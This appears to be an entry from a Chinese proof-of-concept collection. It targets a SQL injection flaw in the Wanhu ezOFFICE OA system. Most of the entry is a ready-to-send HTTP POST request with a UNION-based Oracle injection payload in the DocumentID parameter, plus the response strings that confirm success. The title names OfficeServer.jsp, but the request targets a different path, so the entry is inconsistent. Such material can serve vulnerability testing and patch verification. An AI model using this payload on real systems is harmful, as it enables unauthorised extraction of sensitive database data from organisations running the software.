﻿# 万户 ezOFFICE OfficeServer.jsp 存在SQL注入漏洞 测一

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：北京万户网络技术有限公司ezOFFICE OfficeServer.jsp 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)%7C%7CCHR(107)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(68)%7C%7CCHR(72)%7C%7CCHR(116)%7C%7CCHR(113)%7C%7CCHR(107)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(113)+FROM+DUAL--+ONYT&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
```

> 响应代码特征：-1

> 响应内容特征：qkqpqDHtqkqpq

> 上传文件定位：

> 验证文件来源：万户 OA OfficeServer.jsp 存在SQL注入漏洞 测一.poc
